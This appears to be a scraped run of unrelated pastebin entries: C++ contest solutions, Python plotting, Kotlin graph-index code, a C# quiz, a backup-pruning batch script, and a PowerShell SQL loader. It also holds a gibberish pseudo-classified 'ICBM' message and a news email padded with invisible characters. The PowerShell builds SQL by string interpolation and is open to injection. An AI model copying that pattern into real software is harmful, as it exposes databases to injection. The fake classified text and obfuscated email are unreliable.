    ll exclude = 0;

    ll l=0,r=0, sum = 0;

    while(r<n){
        sum += v[r];
        while(sum >= k){
            sum -= v[l];
            l++;
        }
        exclude += r-l+1;
        r++;
    }

    cout<<ans-exclude<<nl;

}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
XJ9PaavM,E,Ahmed_Negm,C++,Sunday 14th of April 2024 12:41:28 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}

const int N = 1e8+1;
ll spf[N];
ll level[N];
map<ll,set<ll>> inserted;

void sieve(){
    for(ll i = 1; i < N; i++) spf[i] = i;
    for(ll i = 2; i*i < N; i++){
        if(spf[i] == i){
            for(ll j = i*i; j < N; j += i){
                if(spf[j] == j) spf[j] = i;
            }
        }
    }

    for(ll i = 2; i < N; i++){
        ll x = i;
        set<ll> st;
        while(x != 1){
            st.insert(spf[x]);
            x /= spf[x];
        }
        level[i] = (int)st.size();
    }

}


void solve(){
    ll q; cin>>q;


    for(ll i = 0; i < q; i++){
        char c; cin>>c;
        ll x; cin>>x;
        if(c=='>'){
            inserted[level[x]].insert(x);
        }else{
            if(inserted[level[x]].size() == 0){
                cout<<-1<<nl;
            }else
                cout<<*inserted[x].begin()<<nl;
        }
    }


}

int main(){
    files();
    sieve();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
UFPEnsHT,Beans boxplot,WarsWorth,Python,Sunday 14th of April 2024 12:37:07 PM CDT,"import matplotlib.pyplot as plt
import matplotlib as mpl
import pandas as pd
import seaborn as sns
from ucimlrepo import fetch_ucirepo


# fetch dataset
dry_bean_dataset = fetch_ucirepo(id=602)

# data (as pandas dataframes)
bean_features = dry_bean_dataset.data.features
bean_targets = dry_bean_dataset.data.targets

# gets 'Class' column from targets and adds it to bean_features in new data frame
extracted_col = bean_targets['Class']
df = bean_features
df = pd.concat([df, extracted_col], axis=1)


# print(extracted_col)


# define axes
xval = 'Class'
yval = 'Area'


# sets up scatterplot for two conditions

sns.boxplot(
    data=df,
    x=xval,
    y=yval,
    hue='Class',
    palette=(
        'red',
        'green',
        'blue',
        'pink',
        'orange',
        'brown',
        'purple'
    ),
)


# labels axes
plt.xlabel('Bean Types')
plt.ylabel('Area (10,000 pixels)')
plt.title('Beans Boxplot')

plt.show()
"
HeRNjM0X,Edge Index ElasticSearch,bruimafia,Kotlin,Sunday 14th of April 2024 12:24:52 PM CDT,"// Класс SchemaLoader
class SchemaLoader(private val project: Project) {

    suspend fun loadSchema(
        schema: Schema,
        task: Task? = null
    ) {
        logger.info(""Начало загрузки схемы"")

        task?.let {
            task.switchStage(newStage = TaskStage.UPLOADING_SCHEMA)
            task.changeTotal(newTotal = schema.properties.size)
        }

        project.mgmtSuspendTransaction { mgmt ->

            val vertexIndex = project.projectKey + ""_vertex_index""
            mgmt.buildIndex(vertexIndex, Vertex::class.java).also { builderIndex ->
                mgmt.createOntologyTags(builderIndex)

                mgmt.createMetaEntity(builderIndex)

                mgmt.createProperties(
                    builderIndex = builderIndex,
                    properties = schema.properties,
                    task = task
                )
                
                logger.info(""Ожидание создания индекса вершин ${project.projectKey}"")
            }.buildMixedIndex(""search"")
            logger.info(""Индекс $vertexIndex для вершин создан"")


            val edgeIndex = project.projectKey + ""_edge_index""
            mgmt.buildIndex(edgeIndex, Edge::class.java).also { builderIndex ->
                mgmt.createEdge(builderIndex)

                logger.info(""Ожидание создания индекса ребер ${project.projectKey}"")
            }.buildMixedIndex(""search"")
            logger.info(""Индекс $edgeIndex для ребер создан"")
        }

        project.schema = schema

        logger.info(""Конец загрузки и индексации схемы"")
        task?.let { task.switchStage(newStage = TaskStage.Ready) }
    }

    /**
     * Создание свойства для хранения списка онтологических тэгов
     */
    private fun JanusGraphManagement.createOntologyTags(
        builderIndex: JanusGraphManagement.IndexBuilder
    ) {
        //TODO можно создать ONTOLOGICAL_TAGS-single для хранения конечного тэга, кем является сущность.
        // Это может немного оптимизировать конвертацию из Vertex в NodeData

        val propertyNameOntologyTags = ""${ONTOLOGICAL_TAGS.name}-list""
        val propertyOntologyTags = makePropertyKey(propertyNameOntologyTags)
            .dataType(DataType.STRING.jvmClass)
            .cardinality(Cardinality.LIST).make()

        builderIndex.addKey(propertyOntologyTags, Mapping.STRING.asParameter())
    }

    /**
     * Создание мета свойств, используемых в истории
     */
    private fun JanusGraphManagement.createMetaEntity(
        builderIndex: JanusGraphManagement.IndexBuilder
    ) {
        //TODO есть возможность индексации Property у VertexProperty,
        // теоретически это может ускорить поиск по временным промежуткам

        val metaEntity = listOf(
            MANDATE_LABEL.name to DataType.BYTE,
            NODE_CREATED.name to DataType.LONG,
            LABEL_HISTORY_PROPERTY_LOAD_DATE.name to DataType.LONG,
            LABEL_HISTORY_PROPERTY_COLLECTION_DATE.name to DataType.LONG,
            LABEL_HISTORY_PROPERTY_DATE_OF_DOCUMENT_CREATION.name to DataType.LONG,
            LABEL_USER_CHANGE_PROPERTY_NAME.name to DataType.STRING,
            NON_HIERARCHICAL_PRIVACY_CATEGORIES.name to DataType.BYTE,
            LOADING_ID.name to DataType.STRING,
        )

        metaEntity.forEach { (name, type) ->
            val validNameMetaProperty = name.replace(""/"", """")

            val metaPropertyName = ""$validNameMetaProperty-single""

            val metaProperty = makePropertyKey(metaPropertyName)
                .dataType(type.jvmClass)
                .cardinality(Cardinality.SINGLE).make()

            builderIndex.addKey(metaProperty)
            
            logger.debug(""Добавлено МЕТА-СВОЙСТВО: $validNameMetaProperty"")
        }
    }

    /**
     * Создание всех свойств в схеме
     */
    private suspend fun JanusGraphManagement.createProperties(
        builderIndex: JanusGraphManagement.IndexBuilder,
        properties: List<PropertySchema>,
        task: Task? = null
    ) {
        properties.forEach { property ->
            val validName = property.key.replace(""/"", """")

            val propertyNameSingle = ""$validName-single""
            val propertyNameList = ""$validName-list""

            val propertySingle = makePropertyKey(propertyNameSingle)
                .dataTypeConverter(property)
                .cardinality(Cardinality.SINGLE).make()

            val propertyList = makePropertyKey(propertyNameList)
                .dataTypeConverter(property)
                .cardinality(Cardinality.LIST).make()

            if (property.isIndex) {

                when (property.dataType) {
                    DataType.STRING -> {
                        builderIndex.addKey(propertySingle, Mapping.TEXTSTRING.asParameter())
                        builderIndex.addKey(propertyList, Mapping.TEXTSTRING.asParameter())
                    }

                    DataType.GEOSHAPE -> {
                        builderIndex.addKey(propertySingle, Mapping.BKD.asParameter())
                        builderIndex.addKey(propertyList, Mapping.BKD.asParameter())
                    }

                    else -> {
                        builderIndex.addKey(propertySingle, Mapping.DEFAULT.asParameter())
                        builderIndex.addKey(propertyList, Mapping.DEFAULT.asParameter())
                    }
                }

            }

            task?.let { task.increment() }

            logger.debug(""Добавлено СВОЙСТВО: $validName"")
        }
    }

    /**
     * Создание ребра
     */
    private fun JanusGraphManagement.createEdge(
        builderIndex: JanusGraphManagement.IndexBuilder,
    ) {

        builderIndex.addKey(edgeNameProperty)
        //builderIndex.addKey(edgeNameProperty, Mapping.TEXTSTRING.asParameter())
        
        
        val metaProperty = makePropertyKey(EDGE_NAME.name)
            .dataType(DataType.STRING.jvmClass)
            .cardinality(Cardinality.SINGLE).make()
 
        val edge = makeEdgeLabel(EDGE.name).multiplicity(Multiplicity.MULTI).make()
        buildEdgeIndex(edge, ""edge-index"", Direction.BOTH, Order.desc, metaProperty)
 
        val metaEntity = listOf(
            EDGE_NAME.name to DataType.STRING,
        )
 
        metaEntity.forEach { (name, type) ->
            val validNameMetaProperty = name.replace(""/"", """")
 
            val metaPropertyName = ""$validNameMetaProperty-single""
 
            val metaProperty = makePropertyKey(metaPropertyName)
                .dataType(type.jvmClass)
                .cardinality(Cardinality.SINGLE).make()
 
            builderIndex.addKey(metaProperty, Mapping.TEXTSTRING.asParameter())
 
            logger.debug(""Добавлено РЕБРО: ${validNameMetaProperty}"")
        }
        
    }

    private fun PropertyKeyMaker.dataTypeConverter(property: PropertySchema): PropertyKeyMaker =
        when (property.dataType) {
            DataType.GEOSHAPE -> dataType(Geoshape::class.java)
            else -> dataType(property.dataType.jvmClass)
        }
        
}


// Класс EdgeRepository
class EdgeRepository {
    fun createEdge(
        edgeKey: String,
        edgeSourceId: String,
        edgeTargetId: String,
        traversal: GraphTraversalSource,
    ): String =
        traversal
            .addE(EDGE.name)
            .property(EDGE_NAME.single, edgeKey) // добавление мета свойства с именем ребра
            .from(step.V<Edge>(edgeSourceId))
            .to(step.V<Edge>(edgeTargetId))
            .next()
            .id()
            .toString()
}


// Метод isExistEdge()
 fun isExistEdge() = traversal
            .V().has(LOADING_ID.single, edge.source.id)
            .bothE().has(EDGE_NAME.single, edge.key)
            .otherV().has(LOADING_ID.single, edge.target.id)
            .hasNext()"
tX9ag0Cd,Untitled,Abdula_2314124,C#,Sunday 14th of April 2024 12:21:48 PM CDT,"namespace Fproject
{
    class Program
    {
        static void Main(string[] args)
        {
            string[] questions =
            {
                ""Юніті vs Unreal?"",
                ""int vs float?"",
                ""Львівське Різдвяне vs Балтіка?"",
                ""A vs B?""
            };
            string[] rightAnswers =
            {
                ""Unity"",
                ""inteFLoat"",
                ""Lvivske"",
                ""AB""
            };

            Random rnd = new Random();
            var index = rnd.Next(0, questions.Length);
            Game(questions, rightAnswers, rnd, index);

        }

        static void Game(string[] questions, string[] rightAnswers, Random rnd, int index)
        {
            while (true)
            {
                Console.WriteLine(questions[index]);
                int prevIndex = index;
                string userAnswer = Console.ReadLine();
                CheckRightIndex(rightAnswers, rnd, index, userAnswer);
                index = UpdateIndex(questions, rnd, index, prevIndex);
            }
        }

        static void CheckRightIndex(string[] rightAnswers, Random rnd, int index, string userAnswer)
        {
            if (rightAnswers[index].Equals(userAnswer))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(""GOOOD"");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(""BADDDDDDDDDD"");
                Console.ResetColor();
            }
        }

        static int UpdateIndex(string[] questions, Random rnd, int index, int prevIndex)
        {
            while (index == prevIndex)
            {
                index = rnd.Next(0, questions.Length);
            }

            return index;
        }
    }
}
"
vgQULrDS,A,Ahmed_Negm,C++,Sunday 14th of April 2024 12:13:26 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}


void solve(){
    int n; cin>>n;
    while(n--) cout<<""EZ"";

}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
uk8J8keD,B,Ahmed_Negm,C++,Sunday 14th of April 2024 12:12:28 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}


void solve(){
    ll n,m,k; cin>>n>>m>>k;
    ll maxi = n*m-(n+m-1);


    cout<<(k>maxi?""NO"":""YES"")<<nl;

}

int main(){
    files();
    int t = 1; 
    cin>>t;
    while(t--) solve();

    return 0;
}"
vRm7ru7G,"DC-SCOM-0049225""Senior Command Specified ICBM Head ing for Territorial Dispute Finalized",zoleilsbin,C#,Sunday 14th of April 2024 12:09:11 PM CDT,"[c]								[c]	PARAMETRIC/CODIFIED LINE
[1] 	RKC SENIOR COMMAND		[1]	1st INFLINE
[2]_____________________________[2]
[3] SECOM CODIFIED MESSAGE		[3]
[4] PURSUANT TO QUERY #			[>]
[>]				0024133A		[4]
[5]_SCRIPT:_ICBM_PATHFINDING_ARC[5]
[6]	Rustembly					[6]
[7]	dnte:""rasm"",msth:""mcbm"";""icb[>]
[>]m"",note:""note"",break			[7]
[8]_____________________________[8]
[9] dnte:""meta"",date:""001/"";	[9]
[0]""023/"";""1997"",break__________[0]	2nd INFLINE

Courtesy of RKC Records and Information Safekeeping Administration ...
UNCLASSIFIED as of 05/12/1999, RKC RAISA Query Number Identifier :
									DC-SCOM-0049225
								   ""Senior Command Specified ICBM Head
ing for Territorial Dispute Finalized Attack for 93th Parallel""

RASM Version 1.02bt
Written by  Joseph Caesar McLaene
			Cassandra Tinshihiba"
kCF7AguG,Minecraft Backup Upkeep with Dropbox,Ra7eN,Lua,Sunday 14th of April 2024 12:08:20 PM CDT,":: This file will make sure only the most recent 5 backups are kept
:: When making backup ups in the ""minutes"" like I work heavy in mine so 
:: i have it set to every 15min, this ofcourse fills up the backup folder
:: so I wrote this to make sure only 5 are there.
:: as an extra, I have only the recent file of the day to send to dropbox


@echo off
setlocal EnableDelayedExpansion

:: Set the backup directory to the correct path
set ""BACKUP_DIR=C:\Minecraft Server\WorldBackup""
set ""DROPBOX_DIR=%USERPROFILE%\Dropbox\Minecraft""

:: Navigate to the backup directory
cd /d ""%BACKUP_DIR%""

:: Create a temporary file list in the temp directory
set ""temp_file=%temp%\%~n0.tmp""
dir /b /a-d /o-d ""* (Full).7z"" > ""!temp_file!""

:: Count the total number of backup files
set /a ""file_count=0""
for /f ""tokens=*"" %%a in ('type ""!temp_file!""') do set /a file_count+=1

:: Only run deletion if there are more than 5 backup files
if !file_count! GTR 5 (
    set /a ""count=0""
    
    :: Process each file, deleting those beyond the fifth
    for /f ""tokens=*"" %%f in ('type ""!temp_file!""') do (
        set /a count+=1
        if !count! GTR 5 (
            echo Deleting: %%f
            del ""%%f""
        )
    )
    echo Backup cleanup is complete.
) else (
    echo ""Not enough files to start cleanup. Only !file_count! file(s) out of 5 required found.""
)

:: Identify the most recent file (which is the first one in the list due to the order by date descending)
set ""most_recent_file=""
for /f ""tokens=*"" %%g in ('type ""!temp_file!""') do (
    if not defined most_recent_file set ""most_recent_file=%%g""
)

:: Check if the Dropbox directory exists and create if not
if not exist ""!DROPBOX_DIR!"" mkdir ""!DROPBOX_DIR!""

:: Copy the most recent file to the Dropbox directory
if defined most_recent_file (
    echo Copying the most recent file: !most_recent_file! to Dropbox...
    copy ""!BACKUP_DIR!\!most_recent_file!"" ""!DROPBOX_DIR!""
    echo Most recent file copied successfully.
) else (
    echo No files were found to copy.
)

:: Clean up the temporary file
del ""!temp_file!""

endlocal
"
xhwuQ6e5,C,Ahmed_Negm,C++,Sunday 14th of April 2024 12:02:53 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}

bool pali(string s){
    string t = s;
    reverse(t.begin(), t.end());
    return s == t;
}

void solve(){
    int n; cin>>n;
    vector<string> v(n);
    for(int i=0; i<n; i++) cin>>v[i];
    for(int i=0;i<n;i++){
        for(int j=i+1;j<n;j++){
            if(pali(v[i]+v[j]) || pali(v[j]+v[i])){
                cout<<""Yes\n"";
                return;
            }
        }
    }
    cout<<""No\n"";
}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
kRPLkSkL,D,Ahmed_Negm,C++,Sunday 14th of April 2024 11:59:54 AM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}


void solve(){
    ll a,b,c,d; cin>>a>>b>>c>>d;
    if(a > b) swap(a,b);

    ll ans = b/c - (a-1)/c + b/d - (a-1)/d - b/(c*d) + (a-1)/(c*d);
    cout<<b-a+1-ans<<nl;

}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
gdin5kEV,Get-ChildItem - Optimize?,Kevinator,PowerShell,Sunday 14th of April 2024 11:18:22 AM CDT,"# Get Episodes
Get-ChildItem $showDirectory -Recurse -File | Where-Object { $_.Extension -in ("".mp4"", "".mkv"", "".avi"", "".m4v"", "".mpg"") } | ForEach-Object {

    $insertQuery = @""
    INSERT INTO Episodes VALUES ('$($_.Directory.Parent.Name -replace ""'"", """")',
                                '$($_.Directory.Name)',
                                '$($_.Name -replace ""'"", """")',
                                '$($_.Length)',
                                '$((ReadableFileSize $_.Length))',
                                '$((VideoDurationSeconds $_.FullName))',
                                '$((ReadableDuration $_.FullName))',
                                '$((Get-VideoResolution $_.FullName))',
                                '$($_.Extension)',
                                '$($_.LastWriteTime)',
                                '$($_.CreationTime)',
                                GETDATE())
""@
    Invoke-Sqlcmd -ConnectionString $connectionString -Query $insertQuery -ErrorAction Stop
}"
RSr1vRU8,News April14 24,Newscaster_Ned,Email,Sunday 14th of April 2024 10:41:51 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎,‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎!‎ ‎I‎t‎'‎s‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎t‎o‎ ‎g‎i‎v‎e‎ ‎y‎o‎u‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎!‎

A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎O‎w‎n‎ ‎7‎0‎0‎ ‎M‎i‎l‎l‎i‎o‎n‎+‎ ‎M‎a‎g‎s‎ ‎W‎i‎t‎h‎ ‎G‎r‎e‎a‎t‎e‎r‎ ‎T‎h‎a‎n‎ ‎1‎0‎-‎R‎o‎u‎n‎d‎ ‎C‎a‎p‎a‎c‎i‎t‎y‎
W‎A‎T‎C‎H‎:‎ ‎U‎F‎C‎'‎s‎ ‎R‎e‎n‎a‎t‎o‎ ‎M‎o‎i‎c‎a‎n‎o‎ ‎G‎o‎e‎s‎ ‎o‎n‎ ‎E‎p‎i‎c‎ ‎P‎r‎o‎-‎A‎m‎e‎r‎i‎c‎a‎ ‎R‎a‎n‎t‎ ‎A‎f‎t‎e‎r‎ ‎B‎i‎g‎ ‎W‎i‎n‎
N‎Y‎C‎ ‎B‎l‎o‎c‎k‎ ‎B‎e‎c‎o‎m‎e‎s‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎S‎h‎o‎p‎p‎i‎n‎g‎ ‎A‎r‎e‎a‎ ‎f‎o‎r‎ ‎S‎t‎o‎l‎e‎n‎ ‎G‎o‎o‎d‎s‎,‎ ‎P‎r‎o‎s‎t‎i‎t‎u‎t‎i‎o‎n‎
B‎o‎l‎t‎o‎n‎:‎ ‎B‎i‎d‎e‎n‎ ‎E‎m‎b‎a‎r‎r‎a‎s‎s‎m‎e‎n‎t‎ ‎t‎o‎ ‎U‎.‎S‎.‎ ‎f‎o‎r‎ ‎A‎s‎k‎i‎n‎g‎ ‎I‎s‎r‎a‎e‎l‎ ‎N‎o‎t‎ ‎t‎o‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎e‎
W‎A‎T‎C‎H‎:‎ ‎T‎e‎x‎a‎s‎ ‎M‎i‎l‎i‎t‎a‎r‎y‎ ‎B‎o‎r‎d‎e‎r‎ ‎B‎a‎s‎e‎ ‎C‎o‎n‎s‎t‎r‎u‎c‎t‎i‎o‎n‎ ‎i‎n‎ ‎F‎u‎l‎l‎ ‎S‎w‎i‎n‎g‎
S‎c‎o‎t‎t‎i‎s‎h‎ ‎L‎e‎a‎d‎e‎r‎'‎s‎ ‎P‎o‎p‎u‎l‎a‎r‎i‎t‎y‎ ‎C‎o‎l‎l‎a‎p‎s‎e‎s‎ ‎A‎f‎t‎e‎r‎ ‎H‎a‎t‎e‎ ‎S‎p‎e‎e‎c‎h‎ ‎L‎a‎w‎ ‎I‎n‎t‎r‎o‎d‎u‎c‎e‎d‎
M‎a‎r‎c‎o‎ ‎R‎u‎b‎i‎o‎:‎ ‎B‎i‎d‎e‎n‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎I‎s‎r‎a‎e‎l‎ ‎t‎o‎ ‎N‎o‎t‎ ‎R‎e‎s‎p‎o‎n‎d‎ ‎'‎E‎n‎c‎o‎u‎r‎a‎g‎e‎s‎ ‎I‎r‎a‎n‎'‎
O‎.‎J‎.‎ ‎S‎i‎m‎p‎s‎o‎n‎ ‎t‎o‎ ‎b‎e‎ ‎C‎r‎e‎m‎a‎t‎e‎d‎,‎ ‎B‎r‎a‎i‎n‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎B‎e‎ ‎D‎o‎n‎a‎t‎e‎d‎ ‎t‎o‎ ‎C‎T‎E‎ ‎R‎e‎s‎e‎a‎r‎c‎h‎
K‎i‎r‎b‎y‎:‎ ‎B‎i‎d‎e‎n‎ ‎C‎a‎l‎l‎e‎d‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎t‎o‎ ‎C‎o‎n‎g‎r‎a‎t‎u‎l‎a‎t‎e‎ ‎o‎n‎ ‎I‎r‎a‎n‎ ‎D‎r‎o‎n‎e‎ ‎D‎e‎f‎l‎e‎c‎t‎i‎o‎n‎
J‎o‎h‎n‎ ‎B‎o‎l‎t‎o‎n‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎D‎o‎e‎s‎n‎'‎t‎ ‎H‎a‎v‎e‎ ‎A‎n‎y‎ ‎I‎d‎e‎a‎ ‎W‎h‎a‎t‎ ‎t‎o‎ ‎D‎o‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎d‎d‎l‎e‎ ‎E‎a‎s‎t‎'‎
1‎1‎ ‎S‎h‎o‎t‎ ‎D‎u‎r‎i‎n‎g‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎N‎i‎g‎h‎t‎ ‎I‎n‎c‎i‎d‎e‎n‎t‎ ‎i‎n‎ ‎M‎a‎y‎o‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎'‎s‎ ‎C‎h‎i‎c‎a‎g‎o‎
A‎p‎p‎e‎a‎l‎s‎ ‎C‎o‎u‎r‎t‎ ‎L‎e‎a‎v‎e‎s‎ ‎H‎o‎l‎d‎ ‎i‎n‎ ‎P‎l‎a‎c‎e‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎O‎r‎e‎g‎o‎n‎ ‎G‎u‎n‎ ‎C‎o‎n‎t‎r‎o‎l‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎I‎s‎r‎a‎e‎l‎

H‎u‎n‎d‎r‎e‎d‎s‎ ‎o‎f‎ ‎D‎r‎o‎n‎e‎s‎,‎ ‎M‎i‎s‎s‎i‎l‎e‎s‎

R‎e‎p‎o‎r‎t‎:‎ ‎B‎i‎d‎e‎n‎ ‎W‎o‎n‎’‎t‎ ‎B‎a‎c‎k‎ ‎C‎o‎u‎n‎t‎e‎r‎a‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎T‎e‎h‎r‎a‎n‎

W‎h‎a‎t‎ ‎W‎i‎l‎l‎ ‎I‎D‎F‎ ‎D‎o‎?‎
I‎r‎a‎n‎ ‎-‎ ‎T‎E‎L‎ ‎A‎V‎I‎V‎,‎ ‎I‎S‎R‎A‎E‎L‎ ‎-‎ ‎O‎C‎T‎O‎B‎E‎R‎ ‎1‎8‎:‎ ‎(‎-‎-‎-‎-‎E‎D‎I‎T‎O‎R‎I‎A‎L‎ ‎U‎S‎E‎ ‎O‎N‎L‎Y‎ ‎-‎ ‎M‎A‎N‎D‎A‎T‎O‎R‎Y‎ ‎C‎R‎E‎D‎I‎T‎ ‎-‎ ‎'‎I‎S‎R‎A‎E‎L‎
T‎h‎e‎ ‎U‎.‎S‎.‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎b‎a‎c‎k‎ ‎I‎s‎r‎a‎e‎l‎ ‎i‎n‎ ‎a‎ ‎c‎o‎u‎n‎t‎e‎r‎a‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎r‎a‎n‎,‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎t‎o‎l‎d‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎i‎n‎ ‎a‎ ‎p‎h‎o‎n‎e‎ ‎c‎a‎l‎l‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎i‎n‎t‎o‎ ‎S‎u‎n‎d‎a‎y‎ ‎a‎f‎t‎e‎r‎ ‎I‎r‎a‎n‎ ‎l‎a‎u‎n‎c‎h‎e‎d‎ ‎3‎0‎0‎ ‎m‎i‎s‎s‎i‎l‎e‎s‎ ‎a‎n‎d‎ ‎d‎r‎o‎n‎e‎s‎ ‎a‎t‎ ‎I‎s‎r‎a‎e‎l‎.‎

M‎i‎c‎h‎a‎e‎l‎ ‎D‎o‎u‎g‎l‎a‎s‎ ‎S‎a‎y‎s‎ ‎P‎l‎a‎y‎i‎n‎g‎ ‎a‎ ‎7‎0‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎F‎r‎a‎n‎k‎l‎i‎n‎ ‎i‎n‎ ‎a‎ ‎T‎V‎ ‎S‎h‎o‎w‎ ‎G‎i‎v‎e‎s‎ ‎H‎i‎m‎ ‎H‎o‎p‎e‎ ‎A‎b‎o‎u‎t‎ ‎8‎1‎-‎Y‎
M‎i‎c‎h‎a‎e‎l‎ ‎D‎o‎u‎g‎l‎a‎s‎:‎ ‎B‎i‎d‎e‎n‎ ‎N‎o‎t‎ ‎T‎o‎o‎ ‎O‎l‎d‎ ‎t‎o‎ ‎S‎e‎r‎v‎e‎
9‎1‎6‎
S‎i‎x‎ ‎K‎i‎l‎l‎e‎d‎,‎ ‎M‎u‎l‎t‎i‎p‎l‎e‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎i‎n‎ ‎S‎y‎d‎n‎e‎y‎ ‎S‎h‎o‎p‎p‎i‎n‎g‎ ‎M‎a‎l‎l‎ ‎S‎t‎a‎b‎b‎i‎n‎g‎ ‎A‎t‎t‎a‎c‎k‎,‎ ‎S‎u‎s‎p‎e‎c‎t‎ ‎S‎h‎o‎t‎ ‎D‎e‎a‎d‎
S‎i‎x‎ ‎K‎i‎l‎l‎e‎d‎,‎ ‎M‎u‎l‎t‎i‎p‎l‎e‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎i‎n‎ ‎S‎y‎d‎n‎e‎y‎ ‎S‎h‎o‎p‎p‎i‎n‎g‎ ‎M‎a‎l‎l‎ ‎S‎t‎a‎b‎b‎i‎n‎g‎ ‎A‎t‎t‎a‎c‎k‎
4‎,‎5‎9‎3‎
R‎e‎p‎o‎r‎t‎:‎ ‎I‎r‎a‎n‎ ‎L‎a‎u‎n‎c‎h‎e‎s‎ ‎A‎t‎t‎a‎c‎k‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎I‎s‎r‎a‎e‎l‎ ‎w‎i‎t‎h‎ ‎L‎o‎n‎g‎-‎r‎a‎n‎g‎e‎ ‎D‎r‎o‎n‎e‎s‎
R‎e‎p‎o‎r‎t‎:‎ ‎I‎r‎a‎n‎ ‎L‎a‎u‎n‎c‎h‎e‎s‎ ‎A‎t‎t‎a‎c‎k‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎I‎s‎r‎a‎e‎l‎ ‎w‎i‎t‎h‎ ‎L‎o‎n‎g‎-‎r‎a‎n‎g‎ ‎D‎r‎o‎n‎e‎s‎
1‎6‎,‎0‎0‎9‎
